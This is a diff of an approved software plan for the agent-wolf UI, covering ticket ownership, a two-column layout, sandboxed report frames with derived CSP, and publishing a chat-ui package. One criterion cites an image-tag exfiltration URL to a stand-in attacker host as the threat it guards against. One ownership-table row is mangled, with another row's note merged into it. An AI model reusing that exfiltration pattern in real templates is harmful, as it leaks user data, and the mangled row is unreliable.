@@ -13,8 +13,16 @@
 > context, that is a defect in this plan — log it.
 
 Status: approved
-Revision: 4 (2026-08-21) — incorporates two adversarial reviews, one executability audit and
-the report-layer amendment; see the Discovered Issues Log, entries R1–R124. Two owner rulings on 2026-08-21 added W8b and W2b, so the ticket count is 41, not 39. Waves 1 (O1, O7, W1),
+Revision: 5 (2026-08-24) — incorporates two adversarial reviews, one executability audit, the
+report-layer amendment and **the UI design** (`design/2026-08-24-agent-wolf-ui.md`, approved
+2026-08-24); see the Discovered Issues Log, entries R1–R130. Two owner rulings on 2026-08-21 added
+W8b and W2b; revision 5 adds O12, W27, W28, W29 and W30, so the ticket count is **46**, not 39.
+
+⚠️ **Revision 5 reverses a standing decision and rewrites five criteria.** `web/` **is** installable
+— proved by building, packing and consuming it (see **R125**) — so Wolf now imports Orange's types
+and presentational components and iframes only the chat. The detail page is two columns, the board
+is an attention queue, and trust is rendered on two independent channels. **Read
+`design/2026-08-24-agent-wolf-ui.md` before touching W13, W14, W19, W21, W22, W23 or W24.** Waves 1 (O1, O7, W1),
 2 (O2, O11, W2, W3, W6), 3 (O3, O4, W4, W7, plus W1b and W6b) and 4 (O5, O6a, W5, W12, O8) have
 been executed; their tickets carry Notes.
 
@@ -74,10 +82,15 @@ append route** — and builds Wolf on top of them.
 
 ### Decisions taken during design, with their reasons
 
-- **Iframe-only UI reuse.** `web/` is `private: true` with `"noEmit": true`, consumed by
-  `examples/web` through a Vite alias into `web/src/index.ts` plus a ten-package dedupe list
-  (`examples/web/vite.config.ts:21-38`). It is not installable. Wolf builds its own components
-  and shows Orange conversations only through `GET /embed/session/{name}#token=…`.
+- **Tiered UI reuse — REVISED 2026-08-24, revision 5 (was "iframe-only").** `web/` *is*
+  installable; the blockers were `"private": true`, one `"noEmit": true` line, and five runtime
+  deps misfiled under `devDependencies`. Proved by building, packing and rendering it inside a
+  foreign app (**R125**). Wolf therefore **imports** Orange's types and pure logic (tier 1) and its
+  presentational components (tier 2) from `@agentkit/chat-ui`, rendered under **Wolf's own**
+  `ThemeProvider` — 45 of 53 components take props and nothing else. Only `AgentChat` and the
+  stateful pages (tier 3) stay behind `GET /embed/session/{name}#token=…`, because that is the one
+  tier where an Orange change would force every client app to move. Rationale and the tier table:
+  `design/2026-08-24-agent-wolf-ui.md` § 1.
 - **Dataset atom in Orange, not a file store in Wolf.** It matches Orange's existing atom grain
   (name + labels + version + provenance + selector search, exactly like images, skills and
   memories) and is reusable by every future embedder.
@@ -345,16 +358,18 @@ allows:
 | `go/httpapi/httpapi.go` | O5, O7, O11 | Strictly serial; each adds a route constant and a registration line to the same two blocks |
 | `go/httpapi/memories.go` | O7, O11 | Strictly serial |
 | `go/cmd/agentd/main.go` | **O5**, O6b, O8 | Strictly serial. O5 was missing from this row for three revisions while its own Files line required modifying `main.go` to wire `DatasetBlobs`; the orchestrator caught it at the wave-4 cut and serialised O5 → O8 by hand. O5 and O8 are both landed, so O6b is the only one left — **R86** |
-| `api/src/routes/hypotheses.ts` | W8, W9, W22 | Strictly serial |
-| `api/src/hypothesis/provision.ts`, `provision.test.ts` | W9, **W10** | Strictly serial. W9 creates them; **W10 changes teardown step 4 to use the shared in-flight exclusion (R112)** — added 2026-08-22 |
+| `api/src/routes/hypotheses.ts` | W8, W9, W22, **W27** | Strictly serial |
+| `api/src/hypothesis/provision.ts`, `provision.test.ts` | W9, **W10** |
+| `api/src/hypothesis/poller.ts`, `poller.test.ts` | W10, **W27** | Strictly serial. W27 adds the ` stale=<n>` token to the summary line W10 writes — added in revision 5, and the same **R94** class of omission it exists to prevent |
+| `web/src/theme.ts`, `web/src/main.tsx`, `web/src/components/trust/*` | **W28** only | W28 authors all of them; W13, W14, W23 and W24 **import** and must not edit. A ticket that adds a second theme or its own severity treatment has broken revision 5's whole point | Strictly serial. W9 creates them; **W10 changes teardown step 4 to use the shared in-flight exclusion (R112)** — added 2026-08-22 |
 | `api/src/routes/auth.ts`, `auth.test.ts` | W8, **W8b** | Strictly serial. W8 creates them; W8b adds `/api/auth/me` and `/api/auth/logout` |
 | `api/src/auth/session.ts`, `session.test.ts` | W8, **W9** | Strictly serial. W8 creates them; **W9 adds the mint-site trim (R103)** — added 2026-08-21 by the wave-6 pre-flight, which is the sixth time the ownership table has been found short (R81, R86, R94, R98, R110 and this) |
-| `api/src/hypothesis/store.ts`, `store.test.ts` | W5, **W8**, **W15**, W10, W22 | **Strictly serial in that order — corrected 2026-08-21, R98.** W8 was missing from this row entirely while its own Files line modifies both files, and the printed order put W10 before W15 although W15's Depends-on is `W5, O11` and W10 sits four tickets deep behind W8 → W9. Honouring the old order would have serialised the whole report layer behind the UI chain for no dependency reason. W8 and W15 are the two chain heads and must not run concurrently; W8 goes first because its chain (W9 → W10 → W11 → W13 → W14) is the longer one |
+| `api/src/hypothesis/store.ts`, `store.test.ts` | W5, **W8**, **W15**, W10, W22, **W27** | **Strictly serial in that order — corrected 2026-08-21, R98.** W8 was missing from this row entirely while its own Files line modifies both files, and the printed order put W10 before W15 although W15's Depends-on is `W5, O11` and W10 sits four tickets deep behind W8 → W9. Honouring the old order would have serialised the whole report layer behind the UI chain for no dependency reason. W8 and W15 are the two chain heads and must not run concurrently; W8 goes first because its chain (W9 → W10 → W11 → W13 → W14) is the longer one |
 | `go/cmd/agentd/auth.go`, `auth_test.go` | O5 only | O5 owns the middleware change; no other ticket may touch it |
 | `go/agentdb/memories.go` | O7, O11 | Strictly serial |
-| `api/src/orange/client.ts`, `client.test.ts` | W2, W15, **W2b** | Strictly serial in that order. W2's route list was declared exhaustive and closed; **W2b adds the twenty-third, `GET /agent/workers/{name}`, by owner decision 2026-08-21 (R91)** — the list is closed against casual addition, not against an owner ruling |
+| `api/src/orange/client.ts`, `client.test.ts` | W2, W15, **W2b**, **W29** | Strictly serial in that order. W2's route list was declared exhaustive and closed; **W2b adds the twenty-third, `GET /agent/workers/{name}`, by owner decision 2026-08-21 (R91)** — the list is closed against casual addition, not against an owner ruling |
 | `api/src/config.ts`, `.env.example` | W1, W6, W7, W8, W9, W10, W11, W12, W16, W21, X1 | **Strictly serial in dependency order.** Each ticket adds only the variables its own criteria name, and documents each in `.env.example` with a comment |
-| `api/src/app.ts` | W1, W7, W8, W11, W21 | Strictly serial; every router is mounted here, by the ticket that creates it |
+| `api/src/app.ts` | W1, W7, W8, W11, W21, **W29** | Strictly serial; every router is mounted here, by the ticket that creates it |
 | `docker-compose.yml` (agent-wolf) | W1, W7, W8, W9, W10, W11, W16, W21, X1 | **Strictly serial, same order as `config.ts`.** A variable in `.env.example` and `config.ts` still never reaches the container without an `environment:` entry here — R81 |
 
 ⚠️ **An earlier revision restricted `config.ts` and `.env.example` to three tickets and forbade
@@ -365,9 +380,9 @@ the serial rule prevents the collision, not an ownership monopoly. Every duratio
 `_SECONDS` and holds a plain integer count of seconds — `WOLF_POLL_INTERVAL_SECONDS`, not
 `WOLF_POLL_INTERVAL`, because "5m" in a variable whose unit is unstated is exactly the ambiguity
 § Vocabulary exists to prevent.
-| `api/src/routes/hypotheses.ts` | W8, W9, W22 | Strictly serial |
-| `api/src/report/*` | W15, W16, W17, W18, W19, W20, W25 | **No collision: each ticket creates its OWN file** — `kinds.ts` (W15), `template.ts` (W16), `sanitise.ts` (W17), `series.ts` (W18), `frame.ts` (W19), `drift.ts` (W20), `__fixtures__/` + `fixture.test.ts` (W25). Ordering is the dependency graph and nothing more, so W17, W18 and W20 may run concurrently once W16 lands. *(This row previously read "See the report-layer sub-graph", naming a section that does not exist — R121. A wildcard row also implied a serialisation these tickets do not need.)* |
-| `web/package.json` | W23, W24 | Strictly serial |
+| `api/src/routes/hypotheses.ts` | W8, W9, W22, **W27** | Strictly serial |
+| `api/src/report/*` | W15, W16, **W30**, W17, W18, W19, W20, W25 | **No collision: each ticket creates its OWN file** — `kinds.ts` (W15), `template.ts` (W16), `sanitise.ts` (W17), `series.ts` (W18), `frame.ts` (W19), `drift.ts` (W20), `__fixtures__/` + `fixture.test.ts` (W25). Ordering is the dependency graph and nothing more, so W17, W18 and W20 may run concurrently once W16 lands. *(This row previously read "See the report-layer sub-graph", naming a section that does not exist — R121. A wildcard row also implied a serialisation these tickets do not need.)* |
+| `web/package.json`, `web/vite.config.ts` | **W28**, W13, W23, W24 | Strictly serial |
 | `web/src/App.tsx` | W13, W24 | Strictly serial |
 | `prompts/*.md` (agent-wolf) | W12, W25 | **Strictly serial in that order.** W12 authors the four prompts and W25 rewrites the report-authoring half; the row was missing entirely until 2026-08-21 — **R94** |
 | `api/src/config.test.ts` | every ticket on the `config.ts` row | **Same serial order as `config.ts`.** A ticket that adds a variable adds its tests here, so the two files move together; the row was missing and W12 landed 68 lines in it without one — **R94** |
@@ -4293,8 +4308,12 @@ W1, W3 and W6 have no Orange dependency and may start immediately in parallel.
   (the one place `import.meta.env` is read), and a `.test.tsx` beside each component and page;
   modify `web/src/App.tsx`, `web/package.json`, `web/Dockerfile`, `docker-compose.yml` (build args
   on `wolf-web`), `.env.example` (the two `VITE_*` defaults).
-  `web/package.json` is on the shared-ownership row with W23 and W24, and `.env.example` with W1,
-  W16 and W21 — run strictly serial with those and add only what is named here.
+  `web/package.json` is on the shared-ownership row with W23, W24 and **W28**, and `.env.example`
+  with W1, W16 and W21 — run strictly serial with those and add only what is named here.
+  **Revision 5:** W28 has already installed `@agentkit/chat-ui`, written `web/src/theme.ts` and set
+  `test.server.deps.inline` in `web/vite.config.ts`. Do not add a second theme, do not re-add the
+  package, and **use `Provenance`/`Severity` from `web/src/components/trust/` rather than inventing
+  a treatment** — that is the whole point of W28 running first.
 - **Acceptance criteria:**
   - **Router: React Router 7** per § "Pinned technology choices". One route table, in
     `web/src/App.tsx`: `/` (board), `/new`, `/archive`, `/hypotheses/:id` — the last a placeholder
@@ -4308,6 +4327,12 @@ W1, W3 and W6 have no Orange dependency and may start immediately in parallel.
     origin, **not** `WOLF_MCP_URL` and not the DinD gateway) and `VITE_GOOGLE_CLIENT_ID`, declared
     as `ARG`/`ENV` in `web/Dockerfile`'s build stage, passed through `build.args` on the `wolf-web`
     service, documented in `.env.example`, and read **only** in `web/src/env.ts`.
+  - 🔴 **`OrangeChatFrame` is a full-height RAIL, not a block in a document** (UI design § 5).
+    It renders at `height: 100%` inside a container the page gives `position: sticky; top: 0;
+    height: 100vh`, width `clamp(340px, 28vw, 460px)`, collapsible, and below the `md` breakpoint it
+    becomes a tab rather than a fixed-height box. This is what makes the frame's height *known*
+    without measuring it, which a cross-origin frame does not permit. A test asserts the rendered
+    frame carries no fixed pixel height.
   - `OrangeChatFrame`'s `src` is `${VITE_ORANGE_PUBLIC_URL}/embed/session/hyp-<id>#token=<token>`,
     composed from the variable — a test stubs the variable and asserts the rendered `src`, so a
     hard-coded origin fails. The session name carries the `hyp-` prefix and the id does not
@@ -4323,7 +4348,14 @@ W1, W3 and W6 have no Orange dependency and may start immediately in parallel.
     `localStorage` or `sessionStorage` across a mount, a refresh and an unmount.
   - The board renders from a **single** `GET /api/hypotheses` response with no per-card follow-up
     request; a test with twelve hypotheses asserts exactly one fetch.
-  - Each card renders title, `StatusChip`, `support_score`, the condition summary, and `headline`
+  - 🔴 **The board is an ATTENTION QUEUE, not a chronological list** (UI design § 4). Rows are
+    grouped into `NEEDS A HUMAN` / `WATCH` / `IN INTERVIEW` / `HOLDING`, by the membership rules and
+    sort orders pinned there, from the tier W27 computes **server-side** — the single-fetch criterion
+    below is unaffected. `HOLDING` is collapsed with a count. An **empty** `NEEDS A HUMAN` section
+    renders its heading with a count of zero rather than hiding: "nothing needs you" must be
+    visible, not inferred. The heading says *a human*, not *you* — anyone allowlisted may act on
+    anything (`owner` is a byline).
+  - Each card renders title, `owner` as a byline, `StatusChip`, `support_score`, the condition summary, and `headline`
     — line 1 of the newest `kind=report` snippet, added to the board payload by W22, so W13's own
     tests drive it from fixtures. `headline: null` renders a distinct "no report yet" state — never
     an empty string, and never omitted, so "said nothing" and "nothing yet" stay distinguishable.
@@ -4359,7 +4391,7 @@ W1, W3 and W6 have no Orange dependency and may start immediately in parallel.
     `docker compose config` cannot
   - `dcc` (the redacted wrapper, § "Executor orientation" — **R82**) shows both args under
     `wolf-web`'s `build.args`
-- **Depends on:** W11, **W8b** *(the signed-in state and the sign-out action come from `GET /api/auth/me` and `POST /api/auth/logout`; before W8b existed this ticket would have had to infer them from a 401 on the board — owner decision 2026-08-21, R100)*
+- **Depends on:** W11, **W8b**, **W28** *(revision 5: W28 owns `web/package.json`'s package install, `web/src/theme.ts`, `web/vite.config.ts`'s `deps.inline`, and the two trust components — this ticket's criteria assume all four already exist)* *(the signed-in state and the sign-out action come from `GET /api/auth/me` and `POST /api/auth/logout`; before W8b existed this ticket would have had to infer them from a 401 on the board — owner decision 2026-08-21, R100)*
 - [ ] done
 - Notes:
 
@@ -4389,7 +4421,14 @@ W1, W3 and W6 have no Orange dependency and may start immediately in parallel.
     `non_positive_reference`, `insufficient_coverage`, `no_observations`. A reason W4 emits that is
     not in that list renders verbatim rather than being dropped — a silently blank reason is how a
     spec mistake (a percentage statistic on a zero-crossing series) stays invisible.
-  - **A stale metric is defined here, not inferred:** a metric is stale when its series response
+  - 🔴 **CORRECTED IN REVISION 5 — staleness has ONE authority, and it is not this ticket.**
+    `EvaluationResult.metrics[]` already carries `stale: boolean` and `stale_reason: Reason | null`,
+    computed by W4 — Wolf's own evaluator — and **that is the authority** for the condition table and
+    the scoreboard. Two definitions in two places disagree the first time the series route returns
+    points newer than the last evaluation. The client-side rule below survives for **exactly one
+    job**: deciding whether `MetricChart` draws its hatched region, with `never_fetched` from the
+    series route distinguishing "never written" from "the last tick failed".
+    For that one job: a metric is stale when its series response
     carries `never_fetched`, or when `Date.now() - lastPoint.tMs > staleness_days * 86_400_000`
     (the spec-level `staleness_days`, default 5). `MetricChart` then shows the last known points
     plus a hatched trailing region and a caption reading exactly one of `never fetched` /
@@ -4425,9 +4464,19 @@ W1, W3 and W6 have no Orange dependency and may start immediately in parallel.
     memories, `research-note`s, `spec-amendment`s and the `verdict`. Every row is labelled trusted
     or untrusted per § "Memory kinds" — the trust boundary is the product, so it is visible.
   - `MetricChart` plots `Point[]` with a UTC-formatted axis and does not interpolate across gaps.
-  - The page is laid out so W23's `VerdictBand` + `ReportPanel` compose **above** the condition
-    table without restructuring it: W23 modifies this same file and the condition table is
-    explicitly unchanged by that ticket.
+  - 🔴 **REWRITTEN IN REVISION 5 — this ticket now ships the TWO-COLUMN SHELL** (UI design § 5).
+    The previous wording ("compose above the condition table **without restructuring it**") is
+    withdrawn: the page is a left column carrying every Wolf-owned region and scrolling normally,
+    beside the sticky full-height conversation rail W13 built. W23's `VerdictBand` and `ReportPanel`
+    compose into the **top of the left column**; the condition table is still unchanged by W23.
+    A test asserts the rail is a sibling of the scrolling column, not a child of it.
+  - **The report panel needs an explicit height and must never negotiate one.** Default
+    `clamp(480px, 70vh, 900px)` with internal scroll, plus an **expand** control opening a
+    full-viewport dialog that renders **the same frame component**, same CSP, same sandbox.
+    🔴 **No `postMessage`-driven resize, asserted by test.** A frame with `sandbox="allow-scripts"`
+    and no `allow-same-origin` can still `postMessage` its parent; honouring a height from it would
+    let model-authored content set Wolf's layout, and a report asking for `40000px` pushes the
+    verdict buttons off the screen. **Layout is not negotiable by untrusted content.**
 - **TDD:** yes for the condition/reason rendering, the staleness rule, the verdict gate, the
   `challenged`-only block and the amend request body; no for layout.
 - **Validation:**
@@ -4435,7 +4484,7 @@ W1, W3 and W6 have no Orange dependency and may start immediately in parallel.
   - `cd web && yarn build` — `tsc -p tsconfig.json && vite build`: it typechecks the whole tree
     and proves the page compiles into the production bundle, neither of which `vitest run` does
     (esbuild strips types without checking them)
-- **Depends on:** W13
+- **Depends on:** W13, **W28** *(the trust channels; revision 5)*
 - [ ] done
 - Notes:
 
@@ -4847,9 +4896,17 @@ braces for the embedded case, with the CSP carrying the load for the direct-navi
 - **Repo:** agent-wolf
 - **Files:** create `api/src/report/frame.ts`, `api/src/report/frame.test.ts`.
 - **Acceptance criteria:**
-  - The CSP string equals the § "The CSP header, byte-for-byte" value **exactly**, asserted as a
-    string literal — including the leading `sandbox allow-scripts` directive. A substring check
-    does not satisfy this criterion.
+  - 🔴 **REWRITTEN IN REVISION 5 — the CSP is DERIVED from the approved template, not constant.**
+    `composeFrame` takes the template's `remoteOrigins` (W30) and emits the skeleton in
+    `design/2026-08-24-agent-wolf-ui.md` § 6b with the sorted, space-joined origin list substituted
+    at its **four** marked positions (`script-src`, `style-src`, `img-src`, `font-src`). The result
+    is asserted **exactly**, as a string literal per case — a substring check satisfies nothing —
+    with a table test over: **no** origins (yielding `script-src 'unsafe-inline'` with no host, the
+    common case and strictly tighter than `https:`); one origin; several; and the same origin
+    arriving from two channels collapsing to one entry. Every non-substituted directive, including
+    the leading `sandbox allow-scripts`, is byte-identical to the skeleton.
+    *This replaces "equals the § 'The CSP header, byte-for-byte' value exactly". That section
+    remains the skeleton's source and its per-clause rationale; it is no longer a whole literal.*
   - `composeFrame` owns the document skeleton (`<!doctype html>`, `<html>`, `<head>`, `<body>`);
     the template fragment is placed inside `<body>`.
   - **Every byte of the template fragment outside a `[data-wolf-slot]` element's children is
@@ -4864,7 +4921,7 @@ braces for the embedded case, with the CSP carrying the load for the direct-navi
   - An unfilled slot renders as an empty element, never the literal string `undefined`.
 - **TDD:** yes.
 - **Validation:** `cd api && yarn test src/report/frame && yarn typecheck`
-- **Depends on:** W17, W18
+- **Depends on:** W17, W18, **W30** *(revision 5: `composeFrame` derives the CSP from `remoteOrigins`)*
 - [ ] done
 - Notes:
 
@@ -4899,6 +4956,10 @@ braces for the embedded case, with the CSP carrying the load for the direct-navi
 - **Files:** create `api/src/routes/report.ts`, `api/src/routes/report.test.ts`; modify
   `api/src/app.ts`.
 - **Acceptance criteria:**
+  - **The CSP the route emits is the one `composeFrame` derived for THAT template** (revision 5,
+    W19). A test writes two templates with different `remoteOrigins` and asserts the two responses
+    carry different `Content-Security-Policy` headers — a route that emits a constant policy fails
+    this criterion even though every W19 test passes.
   - `GET …/report/frame` returns `text/html`, the exact CSP header **including `sandbox
     allow-scripts`**, `X-Content-Type-Options: nosniff`, and **no `Set-Cookie`** — asserted
     explicitly, because the session middleware will otherwise refresh a cookie onto this response.
@@ -4950,6 +5011,15 @@ braces for the embedded case, with the CSP carrying the load for the direct-navi
     serves **404** rather than the forged template.
   - A `report-template` hidden by a retraction whose own provenance is non-empty is still served,
     and carries `tamper` naming the retractor — reusing W15's store reads, not a second code path.
+  - 🔴 **R45 CLOSES HERE, NOT IN W9 (revision 5).** The report-layer amendment says go-live refuses a
+    hypothesis with no `report-template`, and W21 is the only writer of one — which read as a cycle.
+    It is not: go-live has never required a template in code, and W24 → W23 → W22 → W21 means the
+    writer exists before the gate does. **This ticket adds the requirement**, in the one place the
+    plan already puts the other half of the gate: `report.has_template` is already the first field
+    of the pinned report block, so `GET /api/hypotheses/:id` now carries **both** halves —
+    `spec_validation.valid` and `report.has_template` — and W24's button is enabled iff both hold.
+    This ticket also adds the **server-side `422` backstop** on `POST …/go-live` for the race, with
+    a `path` of `report.has_template`. **W9 is not reopened.**
 - **TDD:** yes.
 - **Validation:** `cd api && yarn test src/hypothesis/store src/routes/hypotheses && yarn typecheck`
 - **Depends on:** W21
@@ -4974,8 +5044,16 @@ braces for the embedded case, with the CSP carrying the load for the direct-navi
     asserting test file itself**, so the check cannot fail on its own text.
   - No report → an explicit empty state naming why ("no report yet — the first tick has not run"),
     never a blank frame.
-  - `stripped_count > 0` renders a visible notice with the count; drift renders a visible notice
-    naming the orphan and unfilled slots.
+  - `stripped_count > 0` and drift each render as **`Severity level="degraded"`** (revision 5,
+    from W28) with a **mandatory cause sentence** — the count for the first, the orphan and unfilled
+    slot names for the second. `Severity` refuses to render without a cause; a bare marker that does
+    not say what happened is how a spec mistake stays invisible for three weeks.
+  - **`ReportPanel` sits inside `Provenance kind="model"`** with the writer's stamp above it — the
+    frame is model-authored content and the interface says so, calmly. The provenance ground uses
+    **no semantic palette colour**; borrowing `warning` or `error` here would make every healthy
+    report read as a problem and is asserted against in W28.
+  - **The panel's height is fixed and never negotiated** — the rule and the
+    `postMessage` prohibition are W14's; this ticket implements the component that obeys them.
   - `VerdictBand` renders status, score and the tripped/holding/**indeterminate** counts, with
     `indeterminate` visually distinct from `holding` — the same rule W14 applies to the condition
     table, for the same reason. The word is `indeterminate` throughout; never "unknown".
@@ -4995,8 +5073,15 @@ braces for the embedded case, with the CSP carrying the load for the direct-navi
     by which the interview's proposed template leaves the container — and renders its HTML.
   - The candidate renders **inside the real frame component**, with the real CSP and the real
     sandbox. Reviewing a preview that differs from production defeats the purpose of reviewing.
-  - The external script and stylesheet URLs (`scriptSrcs`) are listed explicitly above the preview.
-    The human is approving remote code; they are shown exactly what it is.
+  - 🔴 **EVERY remote host is listed above the preview, not only the executable ones (revision 5).**
+    `scriptSrcs` covers `script[src]`, `link[rel=stylesheet][href]` and CSS `@import` — so a template
+    that exfiltrates through `img src="https://evil.example/?d=…"` was approved by a human who never
+    saw that host. The screen therefore lists **`remoteOrigins`** (W30) as well: every origin the
+    template will contact, from every channel W16's validator already walks. A test approves a
+    template whose only remote URL is an `img` and asserts its origin appears on screen.
+  - The external script and stylesheet URLs (`scriptSrcs`) are listed explicitly above the preview,
+    distinguished from the rest of `remoteOrigins`. The human is approving remote **code**; they are
+    shown exactly what it is, and separately what else will be fetched.
   - The Go Live button is disabled until the spec validates **and** a template has been accepted,
     with the blocking reasons listed. Neither condition alone enables it.
   - Accepting posts the candidate's HTML to `POST …/report-template` and surfaces a `422` as
@@ -5187,7 +5272,7 @@ braces for the embedded case, with the CSP carrying the load for the direct-navi
   - `cd api && yarn typecheck && yarn test`   *(agent-wolf; 0 skipped)*
   - `cd web && yarn typecheck && yarn test`   *(agent-wolf; 0 skipped)*
   - `./e2e/run.sh`   *(agent-wolf)*, and `./e2e/run.sh tamper-resistance` to prove the filter
-- **Depends on:** O8, O10, W10, W14, W21 *(O8 is the ticket that forwards `WOLF_API_KEY`,
+- **Depends on:** O8, O10, W10, W14, **W22** *(revision 5, R128: X1 goes live, and the "a template must exist" gate is now W22's, not W9's. W22 depends on W21, so the `report-template` route is still covered — but the ticket that can BLOCK a go-live is W22 and that is what X1 must follow.)* *(O8 is the ticket that forwards `WOLF_API_KEY`,
   `WOLF_MCP_TOKEN` and `AGENTKIT_MCP_ENV` to agentd and documents the project map — none of them
   reaches the stack without it, and it is not implied transitively by O10. W10's poller is the only
   thing that moves a hypothesis `live → challenged` and the only writer of the `kind=evaluation`
@@ -5198,10 +5283,209 @@ braces for the embedded case, with the CSP carrying the load for the direct-navi
 
 ---
 
+### O12: Publish `@agentkit/chat-ui`   [Status: pending | Model: opus]
+- **Scope:** Turn `web/` from an aliased source folder into an installable package, to the exact
+  shape the **R125** probe proved. This is the ticket that makes revision 5's tiered UI reuse real.
+- **Repo:** agent-orange
+- **Files:** modify `web/package.json`, `web/tsconfig.json`; create `web/tsconfig.build.json`,
+  `web/scripts/verify-package.sh`; modify `examples/web/vite.config.ts`, `examples/web/package.json`,
+  `.github/workflows/ci.yml`.
+- **Acceptance criteria:**
+  - `web/package.json` drops `"private": true`, carries a real `version`, and **moves five runtime
+    deps out of `devDependencies` into `dependencies`**: `@mui/icons-material`, `react-markdown`,
+    `remark-gfm`, `prism-react-renderer`, `@untitledui/file-icons`. `react`, `react-dom`,
+    `@mui/material` and both `@emotion/*` stay **peer** deps — that is what keeps one React copy and
+    one emotion cache in the consumer, verified by the probe.
+  - **A build config that emits.** `tsconfig.json` keeps `noEmit` for the editor;
+    `tsconfig.build.json` extends it with `noEmit: false`, `allowImportingTsExtensions: false`,
+    `declaration: true`, and **excludes** `src/**/*.test.ts(x)`, `src/__fixtures__` and
+    `src/test-setup.ts` — the probe confirmed those otherwise land in `dist`.
+  - 🔴 **Subpath exports, because without them the tier line is notional.** `exports` declares
+    `"."` (everything), `"./pure"` (tier 1 — types, `agentEventReducer`, `replayEvents`,
+    `artifactTree`, `artifactFilters`, `permalink`; **no React import anywhere in its graph**) and
+    `"./components"` (tier 2 — the presentational components). A test asserts importing
+    `@agentkit/chat-ui/pure` does not pull `AgentChat`. The probe measured **37–45s** of resolution
+    for one test file through the barrel; that cost is the symptom, the unenforceable tier line is
+    the defect.
+  - 🔴 **`web/scripts/verify-package.sh` reproduces the R125 probe as a repeatable check** and CI
+    runs it: build → `npm pack` → install the tarball into a throwaway app with its **own**
+    react/MUI/emotion → render `ArtifactPanel` → assert (a) the artifact filenames appear, (b) the
+    render does not throw (two React copies raise an invalid-hook-call), and (c) **a `live` status
+    dot computes to the CONSUMER's `success.main`, not Orange's** — that last assertion is the whole
+    reason the package exists and is the one a refactor will silently break.
+  - **Orange's own source imports are NOT changed.** The probe isolated this: rebuilding with the
+    11 `@mui/material/styles` imports intact still passed 4/4. Any ticket that "fixes" them is out
+    of scope and should be refused.
+  - `examples/web` consumes `dist` rather than the source alias, and its ten-package `dedupe` list
+    shrinks to whatever remains genuinely necessary — the probe needed **none** in the consumer.
+    `examples/web` must still build.
+  - **No semver ceremony.** Owner decision 2026-08-24: consumers pin exact and both repos move in
+    lockstep — "this isn't an open release of a project". Do not add changelogs, deprecation cycles
+    or release automation.
+- **TDD:** no (packaging), except `verify-package.sh`, which **is** the test.
+- **Validation:**
+  - `cd web && npm run build && ls -l dist/index.js dist/index.d.ts && ! ls dist | grep -q test`
+  - `cd web && ./scripts/verify-package.sh` — must exit 0 and print the computed dot colour
+  - `cd web && npm test && npm run typecheck`
+  - `cd examples/web && yarn build` — proves the shell still builds against `dist`
+- **Depends on:** —
+- [ ] done
+- Notes:
+
+### W27: The attention model   [Status: pending | Model: opus]
+- **Scope:** Make the board's attention tiers computable server-side, from signals the system
+  already produces and then discards.
+- **Repo:** agent-wolf
+- **Files:** modify `api/src/hypothesis/store.ts`, `api/src/hypothesis/poller.ts`,
+  `api/src/routes/hypotheses.ts` and their tests.
+- **Acceptance criteria:**
+  - 🟢 **`attention` is already computed daily and thrown away — surface it.** W10's poller appends
+    ` attention=<n>` to line 1 of the evaluation memory (`store.ts:583`), and
+    `parseEvaluationSummaryLine` tokenises the whole line into `found`, requires five keys, and
+    returns only those five (`store.ts:466-483`). Add `attention?: number` to
+    `EvaluationSummaryLine` and read it. **Absent stays absent** — do not default it to `0`, or
+    "nothing raised" and "an old memory written before this token existed" become the same value.
+  - **`stale=<n>` joins the summary line, by the same mechanism and for the same reason.**
+    Staleness lives in `EvaluationResult.metrics[].stale`, inside the JSON body, and the board reads
+    only the 500-byte snippet. Emit the token **only when `n > 0`**. The justification is W10's own:
+    the memory is written only when line 1 changes, so a signal that is not on line 1 has its own
+    write suppressed. A test asserts an evaluation memory written before this token existed still
+    parses (the parser ignores unrecognised tokens — that is what makes this safe).
+  - **`attention_requests` reaches the board.** It is currently detail-only. It is **one
+    project-wide request**, not one per hypothesis, so W22's criterion is restated as *"exactly
+    three `latest_per` requests plus one project-wide attention read, regardless of hypothesis
+    count"* — a test with twelve hypotheses asserts exactly that.
+  - **Each board row carries `attention_tier`**, exactly one of `needs_human` | `watch` |
+    `in_interview` | `holding`, computed by the rules pinned in
+    `design/2026-08-24-agent-wolf-ui.md` § 4, plus `attention_count` and `stale_count`. A table test
+    covers every rule including the boundaries: a `challenged` row, a row with only `tamper`, a row
+    with only an attention request, a `live` row with `headline === null`, and a healthy row.
+  - **Report drift is deliberately NOT a board signal** — it needs two full-content reads. A test
+    asserts the board issues no per-hypothesis read for drift.
+- **TDD:** yes.
+- **Validation:**
+  - `cd api && yarn test src/hypothesis/store src/hypothesis/poller src/routes/hypotheses && yarn typecheck`
+  - Confirm the vitest summary reports **3 test files** — a positional filter matching nothing runs
+    zero files and exits **0**.
+- **Depends on:** W22
+- [ ] done
+- Notes:
+
+### W28: The design system — theme and the two trust channels   [Status: pending | Model: sonnet]
+- **Scope:** Wolf's theme and the two components every other UI ticket renders trust through. **This
+  runs before W13** so four executors consume one vocabulary instead of inventing four.
+- **Repo:** agent-wolf
+- **Files:** create `web/src/theme.ts`, `web/src/theme.test.ts`,
+  `web/src/components/trust/{Provenance,Severity}.tsx` and a `.test.tsx` beside each; modify
+  `web/package.json`, `web/vite.config.ts`, `web/src/main.tsx`; create `web/vendor/` and add the
+  `@agentkit/chat-ui` tarball. `web/package.json` is shared with W13, W23 and W24 — strictly serial.
+- **Acceptance criteria:**
+  - `@agentkit/chat-ui` is installed from a **local tarball** under `web/vendor/`, referenced as
+    `"file:./vendor/agentkit-chat-ui-<version>.tgz"`. 🔴 **The tarball is produced in the OTHER
+    repository** — O12 leaves it at `agent-orange/web/agentkit-chat-ui-<version>.tgz` via
+    `npm run build && npm pack`, and this ticket copies that file into `agent-wolf/web/vendor/` and
+    commits it. An executor holding only the Wolf worktree cannot create one; if it is absent, O12
+    has not landed and this ticket is not ready. Owner decision 2026-08-24: no registry, both
+    repos lockstep, revisit when a third application appears.
+  - 🔴 **`web/vite.config.ts` sets `test: { server: { deps: { inline: [/@mui/, /@agentkit/] } } }`.**
+    Without it every test importing a shared component dies with
+    `Directory import '.../@mui/material/utils' is not supported resolving ES modules imported from
+    .../@mui/icons-material/esm/utils/createSvgIcon.js`. **That error points at MUI's own ESM build,
+    not at us** (R125), and an executor without this criterion would reasonably conclude the package
+    is broken. A test imports a tier-2 component and renders it, which fails outright without this.
+  - `web/src/theme.ts` implements `design/2026-08-24-agent-wolf-ui.md` § 2b in full: the light and
+    dark palettes, the system/monospace typography split with `tabular-nums`, `spacing: 6`, the
+    `MuiTableCell` and `MuiChip` density overrides, and **`prefers-color-scheme` selection** — the
